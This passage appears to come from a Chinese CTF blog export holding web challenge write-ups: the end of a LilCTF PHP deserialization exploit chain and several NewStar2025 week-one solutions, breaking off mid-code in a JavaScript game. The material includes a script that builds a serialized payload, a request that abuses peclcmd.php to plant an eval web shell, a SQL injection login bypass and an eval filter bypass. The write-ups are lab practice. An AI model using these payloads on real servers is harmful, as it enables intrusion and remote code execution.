class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">Fatal error: Uncaught exception <span class="string">&#x27;Exception&#x27;</span> with message <span class="string">&#x27;nonono!!!&#x27;</span> in /<span class="keyword">var</span>/www/html/index.php:<span class="number">52</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 52</span></span><br></pre></td></tr></table></figure>

<p>很明显我们的目标在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">getToken</span>());</span><br></pre></td></tr></table></figure>

<p>我们先一层一层来，首先看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ser</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$ser</span>, <span class="string">&#x27;admin&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$ser</span>, <span class="string">&#x27;Access&quot;:&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span> (<span class="string">&quot;no way!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>admin</code>​我们能用S:+16进制来绕过，<code>Access&quot;:</code>我们可以用php类名大小写不敏感来绕过</p>
<p>然后我们看到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;value, <span class="string">&#x27;S:&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">           <span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;value));</span><br><span class="line">           <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$ser</span> != <span class="variable language_">$this</span>-&gt;value &amp;&amp; <span class="variable">$instance</span> <span class="keyword">instanceof</span> Access) &#123;</span><br><span class="line">               <span class="keyword">include</span>(<span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">getToken</span>());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;wanna ?&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>前面不能有Access现在又要有，那我们可以利用不完整类来让作为 <code>__PHP_Incomplete_Class_Name</code> 的成员变为类名，然后二次反序列化后消除，得到Access</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;prefix . <span class="string">&#x27;lilctf&#x27;</span> . <span class="variable language_">$this</span>-&gt;suffix . <span class="string">&#x27;.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>路径的话拼接&#x2F;..&#x2F;t跳跃就行，由于最后面固定了后缀为<code>.php</code>，我们可以使用pearcmd，但是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$result</span>, <span class="string">&#x27;pearcmd&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Can I have peachcmd?&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>那我们可以用<code>peclcmd.php</code>平替，直接开写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Access</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$prefix</span> = <span class="string">&#x27;/usr/local/lib/&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span> = <span class="string">&#x27;/../php/peclcmd.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;prefix) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;suffix)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Go to HELL!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;prefix . <span class="string">&#x27;lilctf&#x27;</span> . <span class="variable language_">$this</span>-&gt;suffix;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$result</span>, <span class="string">&#x27;pearcmd&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Can I have peachcmd?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;value)));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ser</span> != <span class="variable language_">$this</span>-&gt;value &amp;&amp; <span class="variable">$ser</span> <span class="keyword">instanceof</span> Access) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Access</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Access&quot;:2&#x27;</span>, <span class="string">&#x27;114514&quot;:3&#x27;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$c</span> .= <span class="string">&#x27;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:6:&quot;Access&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;s:5:&quot;admin&quot;&#x27;</span>, <span class="string">&#x27;;S:5:&quot;\61\64\6d\69\6e&quot;&#x27;</span>, <span class="variable">$a1</span>);</span><br><span class="line"><span class="variable">$a1</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a1</span>, <span class="number">0</span>, -<span class="number">1</span>);<span class="comment">//触发__destruct，跳过throw new Exception(&quot;nonono!!!&quot;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a1</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后就是发送了，我们构造pear命令</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?+config-create+/&lt;?=eval($_POST[cmd])?&gt;+/var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-mel">user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22%5C61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A147%3A%22O%3A6%3A%22LilRan%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A15%3A%22%2Fusr%2Flocal%2Flib%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22%2F..%2Fphp%2Fpeclcmd.php%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A6%3A%22Access%22%3B%7D%22%3B&amp;cmd=<span class="keyword">system</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>闲来无事突然想起来lilctf没有复现，突然发现这题Your Uns3r还挺有意思的，然后了解到了pearcmd.php，花了好些时间来学习，但不知道为什么复现提交完flag后再回来就复现不了了，也发现了自己挺多的小毛病，这里贴上官方wp地址<a href="https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg">https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg</a>，还得继续好好学习，天天向上。</p>
<p>‍</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>newstar2025（week1</title>
    <url>/2025/10/15/newstar2025%EF%BC%88week1/</url>
    <content><![CDATA[<h1 id="newstar2025（week1"><a href="#newstar2025（week1" class="headerlink" title="newstar2025（week1"></a>newstar2025（week1</h1><h2 id="multi-headach3"><a href="#multi-headach3" class="headerlink" title="multi-headach3"></a>multi-headach3</h2><p>hint：什么叫机器人控制了我的头？</p>
<p>一眼robots协议</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/6072fc0e-c1fc-4b83-86fc-6bd4f0099c3a-20251015090210-0ymg8fz.png" class="" title="6072fc0e-c1fc-4b83-86fc-6bd4f0099c3a">

<p>事实证明也是!<img src="/2025/10/15/newstar2025%EF%BC%88week1/27f31a73-8719-4962-ac98-d1672e1161db-20251015090225-b7qnh0f.png" class="" title="27f31a73-8719-4962-ac98-d1672e1161db"></p>
<p>进入&#x2F;hidden.php路由回重定向到主页，换bp抓包</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/40dc4c9e-07a1-475d-80bd-1920f42dcf3c-20251015090311-85d61by.png" class="" title="40dc4c9e-07a1-475d-80bd-1920f42dcf3c">

<h2 id="strange-login"><a href="#strange-login" class="headerlink" title="strange_login"></a>strange_login</h2><p>hint：我当然知道1&#x3D;1了！？</p>
<p>进入是登入界面，万能密码秒了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:admin&#x27; or 1=1#</span><br><span class="line">password:随便填</span><br></pre></td></tr></table></figure>

<h2 id="宇宙的中心是php"><a href="#宇宙的中心是php" class="headerlink" title="宇宙的中心是php"></a>宇宙的中心是php</h2><p>进入网页发现禁用了F12，那我们在更多工具那边打开开发者工具看到个路由s3kret.php</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/34b54820-2667-4e83-99e5-069cf2192340-20251015090937-4kd0vaj.png" class="" title="34b54820-2667-4e83-99e5-069cf2192340">

<p>得到题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">if(isset($_POST[&#x27;newstar2025&#x27;]))&#123;</span><br><span class="line">    $answer = $_POST[&#x27;newstar2025&#x27;];</span><br><span class="line">    if(intval($answer)!=47&amp;&amp;intval($answer,0)==47)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;你还未参透奥秘&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>16进制绕过</p>
<p>POST：<code>newstar2025=0x2f</code></p>
<h2 id="我真得控制你了"><a href="#我真得控制你了" class="headerlink" title="我真得控制你了"></a>我真得控制你了</h2><p>依旧更多工具那边打开开发者工具</p>
<p>删除这个然后就可以按启动了</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/db21b202-efdf-4e10-bf36-5eabbee4923f-20251015092504-4fqohb4.png" class="" title="db21b202-efdf-4e10-bf36-5eabbee4923f">

<p>进入一个登入页面弱密码 admin&#x2F;111111</p>
<p>然后获得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_dynamic_flag</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;ICQ_FLAG&quot;</span>) ?: <span class="string">&#x27;default_flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;恭喜掌握新姿势&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\d*\/~()\s]/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;老套路了，行不行啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\d\s]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;请输入有效的表达式&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$test</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;\$test = <span class="subst">$input</span>;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;表达式错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> == <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">generate_dynamic_flag</span>(<span class="variable">$flag_secret</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: <span class="subst">&#123;$flag&#125;</span>&lt;/div&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: <span class="subst">$test</span> ≠ 2025&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以取反绕过</p>
<p>​<code>/portal.php?newstar=~(~2025)</code></p>
<h2 id="别笑，你也过不了第二关"><a href="#别笑，你也过不了第二关" class="headerlink" title="别笑，你也过不了第二关"></a>别笑，你也过不了第二关</h2><p>一个游戏界面依旧f12观察</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">const</span> game = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;game&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> player = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;player&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> scoreEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> levelEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;level&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> steps = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> maxSteps = <span class="number">10</span>; <span class="comment">// 每关掉落数量</span></span><br><span class="line">    <span class="keyword">let</span> targetScores = [<span class="number">30</span>, <span class="number">1000000</span>]; <span class="comment">// 每关目标分数</span></span><br><span class="line">    <span class="keyword">let</span> currentLevel = <span class="number">0</span>; <span class="comment">// 0 表示第一关</span></span><br><span class="line">    <span class="keyword">let</span> gameEnded = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> finishSpawned = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> playerX = <span class="number">180</span>;</span><br><span class="line">    <span class="keyword">let</span> gateInterval = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&quot;ArrowLeft&quot;</span>) <span class="title function_">movePlayer</span>(-<span class="number">100</span>);</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&quot;ArrowRight&quot;</span>) <span class="title function_">movePlayer</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">movePlayer</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> newX = playerX + offset;</span><br><span class="line">      <span class="keyword">if</span> (newX &lt; <span class="number">0</span> || newX &gt; <span class="number">340</span>) <span class="keyword">return</span>;</span><br><span class="line">      playerX = newX;</span><br><span class="line">      player.<span class="property">style</span>.<span class="property">left</span> = playerX + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">spawnGate</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (steps &gt;= maxSteps || gameEnded || finishSpawned) <span class="keyword">return</span>;</span><br><span class="line">      steps++;</span><br><span class="line">      <span class="keyword">const</span> gate = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      gate.<span class="property">className</span> = <span class="string">&quot;gate&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? <span class="number">60</span> : <span class="number">260</span>;</span><br><span class="line">      gate.<span class="property">style</span>.<span class="property">left</span> = x + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> isAdd = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span>;</span><br><span class="line">      <span class="keyword">if</span> (isAdd) &#123;</span><br><span class="line">        gate.<span class="property">dataset</span>.<span class="property">value</span> = <span class="number">10</span>;</span><br><span class="line">        gate.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">&quot;url(&#x27;2.jpg&#x27;)&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        gate.<span class="property">dataset</span>.<span class="property">value</span> = -<span class="number">10</span>;</span><br><span class="line">        gate.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">&quot;url(&#x27;1.jpg&#x27;)&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      game.<span class="title function_">appendChild</span>(gate);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">const</span> fall = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        y += <span class="number">5</span>;</span><br><span class="line">        gate.<span class="property">style</span>.<span class="property">top</span> = y + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> playerRect = player.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line">        <span class="keyword">const</span> gateRect = gate.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(playerRect.<span class="property">right</span> &lt; gateRect.<span class="property">left</span> ||</span><br><span class="line">              playerRect.<span class="property">left</span> &gt; gateRect.<span class="property">right</span> ||</span><br><span class="line">              playerRect.<span class="property">bottom</span> &lt; gateRect.<span class="property">top</span> ||</span><br><span class="line">              playerRect.<span class="property">top</span> &gt; gateRect.<span class="property">bottom</span>)) &#123;</span><br><span class="line">          score += <span class="built_in">parseInt</span>(gate.<span class="property">dataset</span>.<span class="property">value</span>);</span><br><span class="line">          scoreEl.<span class="property">innerText</span> = <span class="string">&quot;分数: &quot;</span> + score;</span><br><span class="line">          <span class="built_in">clearInterval</span>(fall);</span><br><span class="line">          gate.<span class="title function_">remove</span>();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (steps &gt;= maxSteps &amp;&amp; !finishSpawned) <span class="title function_">spawnFinishLine</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (y &gt; <span class="number">600</span>) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(fall);</span><br><span class="line">          gate.<span class="title function_">remove</span>();</span><br><span class="line">          <span class="keyword">if</span> (steps &gt;= maxSteps &amp;&amp; !finishSpawned) <span class="title function_">spawnFinishLine</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">spawnFinishLine</span>(<span class="params"></span>) &#123;</span><br><span class="line">      finishSpawned = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">const</span> finish = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">      finish.<span class="property">className</span> = <span class="string">&quot;finish-line&quot;</span>;</span><br><span class="line">      finish.<span class="property">style</span>.<span class="property">left</span> = <span class="string">&quot;0px&quot;</span>;</span><br><span class="line">      game.<span class="title function_">appendChild</span>(finish);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">const</span> fall = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        y += <span class="number">5</span>;</span><br><span class="line">        finish.<span class="property">style</span>.<span class="property">top</span> = y + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> playerRect = player.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line">        <span class="keyword">const</span> finishRect = finish.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(playerRect.<span class="property">right</span> &lt; finishRect.<span class="property">left</span> ||</span><br><span class="line">              playerRect.<span class="property">left</span> &gt; finishRect.<span class="property">right</span> ||</span><br><span class="line">              playerRect.<span class="property">bottom</span> &lt; finishRect.<span class="property">top</span> ||</span><br><span class="line">              playerRect.<span class="property">top</span> &gt; finishRect.<span class="property">bottom</span>)) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(fall);</span><br><span class="line">          finish.<span class="title function_">remove</span>();</span><br><span class="line">          <span class="title function_">endLevel</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (y &gt; <span class="number">600</span>) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(fall);</span><br><span class="line">          finish.<span class="title function_">remove</span>();</span><br><span class="line">          <span class="title function_">endLevel</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">endLevel</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (gameEnded) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">clearInterval</span>(gateInterval);</span><br><span class="line">  gateInterval = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (score &gt;= targetScores[currentLevel]) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`恭喜通过第 <span class="subst">$&#123;currentLevel + <span class="number">1</span>&#125;</span> 关！得分: <span class="subst">$&#123;score&#125;</span>`</span>);</span><br><span class="line">    currentLevel++;</span><br><span class="line">    <span class="keyword">if</span> (currentLevel &lt; targetScores.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="comment">// 下一关</span></span><br><span class="line">      <span class="title function_">resetLevel</span>(currentLevel);</span><br><span class="line">      <span class="title function_">startGame</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 全部通关</span></span><br><span class="line">      gameEnded = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&quot;score&quot;</span>, score);</span><br><span class="line"></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&quot;/flag.php&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: formData.<span class="title function_">toString</span>()</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;服务器返回:\n&quot;</span> + data);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;请求失败: &quot;</span> + err);</span><br><span class="line">&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`第 <span class="subst">$&#123;currentLevel + <span class="number">1</span>&#125;</span> 关未达成目标分数 (目标: <span class="subst">$&#123;targetScores[currentLevel]&#125;</span>)，将重新开始本关！`</span>);</span><br><span class="line">    <span class="title function_">resetLevel</span>(currentLevel);</span><br><span class="line">    <span class="title function_">startGame</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resetLevel</span>(<span 